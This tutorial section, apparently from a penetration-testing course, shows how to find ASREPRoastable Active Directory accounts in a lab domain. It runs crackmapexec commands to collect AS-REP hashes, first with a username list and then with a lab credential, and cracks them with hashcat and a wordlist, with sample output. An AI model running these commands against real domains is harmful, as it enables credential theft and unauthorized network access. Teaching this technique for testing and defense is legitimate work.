# Finding ASREPRoastable Accounts

The `ASREPRoast` attack looks for users without Kerberos pre-authentication required. That means that anyone can send an `AS_REQ` request to the KDC on behalf of any of those users and receive an `AS_REP` message. This last kind of message contains a chunk of data encrypted with the original user key derived from its password. Then, using this message, the user password could be cracked offline if the user chose a relatively weak password. To learn more about this attack, check out the module [Active Directory Enumerations & Attacks](https://academy.hackthebox.com/module/details/143/).

If we do not have an account on the domain but have a username list, we maybe get lucky and find an account with the option that does not require Kerberos pre-authentication. If this option is set, it allows us to find encrypted data that can be decrypted with the user's password.

We can use the `LDAP` protocol with the list of users we previously found with the option `--asreproast` followed by a file name and specify the FQDN of the DC as a target. We will search for each account inside the file `users.txt` to identify if there is a least one account vulnerable to this attack:

### **Bruteforcing Accounts for ASREPRoast**

```shell-session
$ crackmapexec ldap dc01.inlanefreight.htb -u users.txt -p '' --asreproast asreproast.out

SMB         dc01.inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        dc01.inlanefreight.htb 445    DC01             $krb5asrep$23$robert@INLANEFREIGHT.HTB:1674ae058d5280dbc25ee678ee938c71$7277ce57387[SNIP]
```

Based on our list, we found one account vulnerable to ASREPRoasting. We can request all accounts that do not require Kerberos pre-authentication if we have valid credentials. Let's use Grace's credentials to request all accounts vulnerable to ASREPRoast.

### **Search for ASREPRoast Accounts**

```shell-session
$ crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! --asreproast asreproast.out

SMB         dc01.inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        dc01.inlanefreight.htb 389    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
LDAP        dc01.inlanefreight.htb 389    DC01             [*] Total of records returned 6
LDAP        dc01.inlanefreight.htb 389    DC01             $krb5asrep$23$robert@INLANEFREIGHT.HTB:5567a4d9df8894497ce50c74c15cbe74$[SNIP]
LDAP        dc01.inlanefreight.htb 389    DC01             $krb5asrep$23$noemi@INLANEFREIGHT.HTB:be96a4ea9e79a3f21c2984fc8b75d1f6$[SNIP]
```

Once we get all the hash, we can use Hashcat with module 18200 and try to crack them. Let's use the `rockyou.txt` wordlist and attempt to crack those hashes:

### **Password Cracking**

```shell-session
$ hashcat -m 18200 asreproast.out /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...                   
                                                                                               
<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921355
* Keyspace..: 14344386

$krb5asrep$23$noemi@INLANEFREIGHT.HTB:40d78fb0fd99b5070f8e519670e72f01$[SNIP]:Password!

<SNIP>
```

We found another way to find a valid account on the domain, which would allow us to gather much more information on the environment and perhaps start to compromise hosts or other users.
